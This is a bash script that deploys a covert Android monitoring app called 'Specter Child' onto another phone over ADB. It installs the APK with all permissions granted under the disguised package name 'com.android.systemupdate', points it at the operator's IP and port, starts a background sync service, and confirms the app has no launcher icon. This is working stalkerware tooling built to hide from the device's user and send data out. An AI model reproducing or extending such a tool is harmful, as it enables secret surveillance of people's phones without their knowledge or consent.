#!/bin/bash
# Specter Child Deployment Script
# Run from Termux on parent phone

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

# Config
CHILD_APK="app/build/outputs/apk/debug/app-debug.apk"
PACKAGE="com.android.systemupdate"
PARENT_PORT=5555

# Get parent's IP
get_parent_ip() {
    ip route get 1 | awk '{print $7;exit}' 2>/dev/null || \
    ifconfig wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' || \
    echo "192.168.1.1"
}

PARENT_IP=$(get_parent_ip)

echo -e "${CYAN}╔═══════════════════════════════════════╗${NC}"
echo -e "${CYAN}║      SPECTER CHILD DEPLOYMENT         ║${NC}"
echo -e "${CYAN}╚═══════════════════════════════════════╝${NC}"
echo ""

# Check for target IP argument
if [ -z "$1" ]; then
    echo -e "${RED}Usage: ./deploy.sh <child_ip> [child_port]${NC}"
    echo -e "Example: ./deploy.sh 192.168.12.125 5555"
    echo ""
    echo "Connected devices:"
    adb devices -l
    exit 1
fi

CHILD_IP="$1"
CHILD_PORT="${2:-5555}"
TARGET="${CHILD_IP}:${CHILD_PORT}"

echo -e "${CYAN}[1/5]${NC} Connecting to child device..."
adb connect "$TARGET" 2>/dev/null || true
sleep 1

# Verify connection
if ! adb -s "$TARGET" get-state 2>/dev/null | grep -q "device"; then
    echo -e "${RED}Failed to connect to $TARGET${NC}"
    echo ""
    echo "Make sure:"
    echo "  1. Child phone has USB debugging enabled"
    echo "  2. Run 'adb tcpip 5555' while connected via USB first"
    echo "  3. Both phones on same WiFi network"
    exit 1
fi
echo -e "${GREEN}Connected to $TARGET${NC}"

echo -e "${CYAN}[2/5]${NC} Installing Specter Child..."
if [ ! -f "$CHILD_APK" ]; then
    echo "Building APK first..."
    ./gradlew assembleDebug -q
fi
adb -s "$TARGET" install -r -g "$CHILD_APK"
echo -e "${GREEN}Installed${NC}"

echo -e "${CYAN}[3/5]${NC} Configuring child with parent server..."
adb -s "$TARGET" shell am broadcast \
    -a "specter.child.CONFIGURE" \
    -n "${PACKAGE}/.receiver.ConfigReceiver" \
    --es server_ip "$PARENT_IP" \
    --ei server_port "$PARENT_PORT" \
    --es device_name "Child_$(date +%s)"
echo -e "${GREEN}Configured: server=$PARENT_IP:$PARENT_PORT${NC}"

echo -e "${CYAN}[4/5]${NC} Starting child service..."
adb -s "$TARGET" shell am startservice \
    -n "${PACKAGE}/.service.SyncService" \
    -a "specter.child.START"
echo -e "${GREEN}Service started${NC}"

echo -e "${CYAN}[5/5]${NC} Verifying headless mode..."
# App is already headless - no launcher icon
echo -e "${GREEN}Complete - app has no launcher icon${NC}"

echo ""
echo -e "${GREEN}╔═══════════════════════════════════════╗${NC}"
echo -e "${GREEN}║         DEPLOYMENT COMPLETE           ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
echo ""
echo -e "Child: ${CYAN}$TARGET${NC}"
echo -e "Parent Server: ${CYAN}$PARENT_IP:$PARENT_PORT${NC}"
echo ""
echo "Child is now syncing to your parent server."
echo ""
echo "Emergency access (if needed):"
echo "  adb -s $TARGET shell pm enable ${PACKAGE}/.ui.EmergencySettingsActivity"
echo "  adb -s $TARGET shell am start -n ${PACKAGE}/.ui.EmergencySettingsActivity"
